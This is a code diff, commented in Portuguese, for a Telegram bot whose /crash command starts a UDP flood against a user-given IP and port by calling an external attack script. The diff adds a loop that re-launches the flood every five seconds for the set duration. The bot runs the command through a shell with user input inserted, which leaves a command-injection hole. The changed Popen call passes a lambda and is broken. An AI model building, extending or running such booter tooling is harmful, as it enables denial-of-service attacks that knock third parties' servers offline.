@@ -21,7 +21,7 @@ def carregar_usuarios():
     except json.JSONDecodeError:
         return [SEU_ID_TELEGRAM]
 
-# Função para salvar usuários autorizados em um arquivo JSON
+# Função para salvar usuários autorizados de um arquivo JSON
 def salvar_usuarios():
     with open("usuarios_autorizados.json", "w") as f:
         json.dump(authorized_users, f)
@@ -62,6 +62,14 @@ def start_message(message):
     )
     bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")
 
+# Função para executar o ataque em loop
+def executar_ataque(ip_porta, threads, duracao):
+    tempo_inicial = time.time()
+    while time.time() - tempo_inicial < int(duracao):
+        comando_terminal = f"python3 start.py UDP {ip_porta} {threads} 5"
+        subprocess.call(comando_terminal, shell=True)
+        time.sleep(5)  # Aguarda 5 segundos antes de enviar novamente
+
 # Comando /crash
 @bot.message_handler(commands=['crash'])
 def crash_server(message):
@@ -89,8 +97,9 @@ def crash_server(message):
         return
 
     gerenciar_ataques()
-    comando_terminal = f"python3 start.py UDP {ip_porta} 10 {tempo}"
-    processo = subprocess.Popen(comando_terminal, shell=True)
+    processo = subprocess.Popen(
+        lambda: executar_ataque(ip_porta, 10, tempo), shell=False
+    )
     processos[ip_porta] = processo
     bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} por {tempo} segundos.")
 
